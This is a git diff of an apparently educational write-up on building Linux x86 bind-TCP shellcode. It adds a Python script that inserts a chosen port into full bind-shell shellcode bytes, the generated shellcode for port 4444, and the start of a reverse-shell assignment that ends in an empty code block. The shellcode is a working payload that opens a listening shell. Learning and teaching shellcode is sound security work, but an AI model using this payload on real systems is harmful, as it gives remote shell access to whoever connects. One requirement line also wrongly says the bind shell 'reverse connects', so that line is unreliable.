@@ -1,9 +1,14 @@
+[This is a placeholder for now](#assignment--2)
 # Assignment #1: Bind TCP Shell
 Create a shell_bind_tcp shellcode that binds to a port and execute a shell on an incoming connection, the port number should be easy to configure.
 
+## Requirements
+- Create Bind Shell TCP shellcode
+- Reverse connects to configured PORT
+- Execs Shell on successful connection
+- Port should be easily configurable
 
 ## Context
-[here](#syscalls)
 Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
 If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".
 
@@ -524,3 +529,53 @@ Shellcode Length: 99
 
 I hope you enjoyed learning about creating a simple shell-bind-tcp using shellcode!
 
+As an added bonus, I've included a python script that allows you to dynamically restructure shellcode to allow for the swapping of ports.
+
+```
+#!/usr/bin/python
+import sys
+    
+if len(sys.argv) != 2:
+  print "Please enter port number..."
+  sys.exit()
+    
+port_number     = int(sys.argv[1])
+bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
+Filter        = [b for b in bts if b > 0]
+Format       = ["\\x" + format(b, 'x') for b in Filter]
+PostJoining          = "".join(Format)
+    
+oldShellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
+oldShellcode +="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
+oldShellcode +="\\x51\\x66\\x68" + PostJoining + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
+oldShellcode +="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
+oldShellcode +="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
+oldShellcode +="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
+oldShellcode +="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
+oldShellcode +="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
+    
+print("\nShellcode with port " + str(port_number) + " is: " + oldShellcode)
+```
+```
+root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/# python port-changer.py 4444
+
+Shellcode with port 4444 is: \x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80
+root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# cat port-changer.py
+```
+# Assignment #2: Reverse TCP Shell
+Create a shell_reverse_tcp shellcode that connects back to an IP address, on a specific a port and execute a shell. The IP address and port number should be easy configurable.
+
+
+## Requirements
+- Create a Reverse Shell TCP shellcode
+- Reverse connects to configured IP and PORT
+- Execs Shell on successful connection
+- IP and Port should be easily configurable
+
+## Approach
+There are dozens of approaches you could take to create shellcode, but before we create it, we first need to need to understand how it works. 
+To better understand what's happening, we're going to reverse enginner and analyze it.
+
+```
+
+```
